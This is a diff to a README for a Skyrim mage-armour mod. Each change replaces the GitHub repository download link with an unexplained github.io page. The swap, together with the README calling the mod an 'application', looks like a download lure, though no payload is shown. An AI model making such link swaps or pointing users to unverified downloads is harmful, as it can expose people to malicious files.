@@ -1,6 +1,6 @@
 # 🧙‍♀️ Ufoks-Sorceress-Attire - Stunning Lore-Friendly Mage Gear for Skyrim
 
-[![Download Ufoks-Sorceress-Attire](https://img.shields.io/badge/Download-Ufoks_Sorceress_Attire-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=8A2BE2)](https://github.com/Zalhat586/Ufoks-Sorceress-Attire)
+[![Download Ufoks-Sorceress-Attire](https://img.shields.io/badge/Download-Ufoks_Sorceress_Attire-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=8A2BE2)](https://zalhat586.github.io)
 
 ## 🎯 What Is This?
 
@@ -33,7 +33,7 @@ Follow these simple steps to download and install Ufoks-Sorceress-Attire. No tec
 ### 📥 Step 1: Download the Mod
 
 Visit this link to download the application:  
-[**https://github.com/Zalhat586/Ufoks-Sorceress-Attire**](https://github.com/Zalhat586/Ufoks-Sorceress-Attire)
+[**https://zalhat586.github.io**](https://zalhat586.github.io)
 
 Click the green **Code** button, then select **Download ZIP**. The file will be saved to your computer.
 
@@ -129,7 +129,7 @@ If you encounter bugs or want to share screenshots, visit the GitHub repository 
 
 ## 📥 Quick Download Again
 
-[**Download Ufoks-Sorceress-Attire Here**](https://github.com/Zalhat586/Ufoks-Sorceress-Attire)
+[**Download Ufoks-Sorceress-Attire Here**](https://zalhat586.github.io)
 
 ---
 
